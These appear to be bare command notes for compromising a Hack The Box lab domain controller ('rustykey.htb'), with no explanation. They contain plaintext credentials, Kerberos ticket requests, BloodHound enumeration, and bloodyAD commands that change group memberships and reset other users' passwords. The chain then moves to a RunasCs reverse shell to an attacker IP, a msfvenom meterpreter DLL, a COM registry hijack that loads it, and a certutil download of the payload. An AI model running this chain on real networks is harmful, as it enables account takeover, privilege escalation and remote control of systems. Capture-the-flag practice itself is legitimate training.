rr.parker / 8#t5HE8L!W3A

timedatectl set-ntp off             
ntpdate rustykey.htb 
impacket-getTGT rustykey.htb/'rr.parker':'8#t5HE8L!W3A'  

nxc ldap 10.10.11.75 -u 'rr.parker' -p '8#t5HE8L!W3A' -k 

bloodhound-python -u 'rr.parker' -d rustykey.htb -c all -v -ns 10.10.11.75

IT-COMPUTER3$ : Rusty88!
 
timedatectl set-ntp off             
ntpdate rustykey.htb 
impacket-getTGT rustykey.htb/'IT-COMPUTER3$':'Rusty88!'



bloodyAD -k --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' add groupMember HELPDESK 'IT-COMPUTER3$'

bloodyAD -k --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' set password bb.morgan 'BA_ga6312'  

bloodyAD -k --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' remove groupMember 'PROTECTED OBJECTS' 'IT'

timedatectl set-ntp off             
ntpdate rustykey.htb 
impacket-getTGT rustykey.htb/'bb.morgan':'BA_ga6312'


bloodyAD -k --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' remove groupMember 'CN=PROTECTED OBJECTS,CN=USERS,DC=RUSTYKEY,DC=HTB' 'SUPPORT'

bloodyAD -k --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' set password ee.reed 'BA_ga6312' 

evil-winrm -i dc.rustykey.htb -u 'ee.reed' -r rustykey.htb 



.\RunasCS.exe ee.reed Abc123456@ powershell.exe -r 10.10.14.152:4444



msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.152 LPORT=4444 -f dll -o hack.dll


reg add "HKLM\Software\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32" /ve /d "C:\Windows\temp\hack.dll" /f


certutil.exe -urlcache -f http://10.10.14.152/hack.dll hack.dll ;